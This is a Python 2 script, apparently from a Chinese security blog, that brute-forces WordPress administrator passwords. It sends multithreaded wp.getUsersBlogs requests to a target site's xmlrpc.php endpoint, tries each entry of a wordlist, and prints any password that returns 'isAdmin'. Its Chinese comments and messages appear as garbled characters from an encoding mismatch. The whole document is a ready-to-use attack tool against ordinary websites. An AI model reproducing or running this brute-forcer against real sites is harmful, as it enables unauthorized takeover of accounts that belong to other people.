#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2015/4/29
# Created by ���Եȴ�
# ���� http://www.waitalone.cn/
import os, sys, time, urllib2
import threading, Queue


def usage():
    os.system(['clear', 'cls'][os.name == 'nt'])
    print '+' + '-' * 50 + '+'
    print '\t Python WordPress�����ƽ⹤�߶��̰߳�'
    print '\t   Blog��http://www.waitalone.cn/'
    print '\t       Code BY�� ���Եȴ�'
    print '\t       Time��2015-04-29'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print '�÷�: ' + os.path.basename(sys.argv[0]) + '  �û���  �����ֵ�  ���ƽ����վURL��ַ  '
        print 'ʵ��: ' + os.path.basename(sys.argv[0]) + '  admin  pass.txt http://www.waitalone.cn/ '
        sys.exit()


queue = Queue.Queue()
lock = threading.RLock()
success = []


class Crack(threading.Thread):
    '''
    WordPress xmlrpc���̱߳����ƽ���
    '''

    def __init__(self, queue):
        super(Crack, self).__init__()
        self.queue = queue
        self.crack_url = url + 'xmlrpc.php'

    def run(self):
        while True:
            try:
                password = self.queue.get()
                if password == None: break
                self.post = '''
                    <?xml version="1.0" encoding="iso-8859-1"?>
                    <methodCall>
                      <methodName>wp.getUsersBlogs</methodName>
                      <params>
                       <param><value>''' + username + '''</value></param>
                       <param><value>''' + password + '''</value></param>
                      </params>
                    </methodCall>
                '''
                self.header = {
                    'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
                    'Referer': self.crack_url
                }
                self.req = urllib2.Request(self.crack_url, data=self.post, headers=self.header)
                self.res = urllib2.urlopen(self.req, timeout=10).read().decode('utf-8').encode('GBK')
            except Exception, msg:
                lock.acquire()
                print '�������쳣���,�Բ�!!!!!!!', msg
                lock.release()
            else:
                lock.acquire()
                if 'faultCode' in self.res:
                    print '[��] ����ү,���ڳ�������: %s' % password
                elif 'isAdmin' in self.res:
                    print '\n[��] ����ү,�����ƽ�ɹ�: %s\n' % password
                    success.append(password)
                lock.release()
            finally:
                self.queue.task_done()


if __name__ == '__main__':
    usage()
    username = sys.argv[1]
    url = sys.argv[3]
    if url[-1] != '/': url += '/'
    print '[��] Ŀ�꣺', url + '\n'
    start = time.time()
    if os.path.isfile(sys.argv[2]):
        passlist = [x.strip() for x in open(sys.argv[2])]
        print '[��] ����ү,��������[ %d ]��!\n' % len(passlist)
        for i in range(10):
            t = Crack(queue)
            t.setDaemon(True)
            t.start()
        for password in passlist:
            queue.put(password)
        queue.join()
        if success:
            print '\n[��] ��ү,����Ʒ̫����,�����ƽ�ɹ�!'
            print '\n[��] �û���: %s,���룺%s' % (username, success[0])
        else:
            print '\n[!] �Բ�,��Ȼû���ҵ�����,��үү��,�ֵ䲻��ѽ!'
        print '\n[!] �Բ�,��ô���ִ������?��ʱ��%s ��' % (time.time() - start)
    else:
        print 'ү,û�������ֵ�,�ƽ��ëѽ?'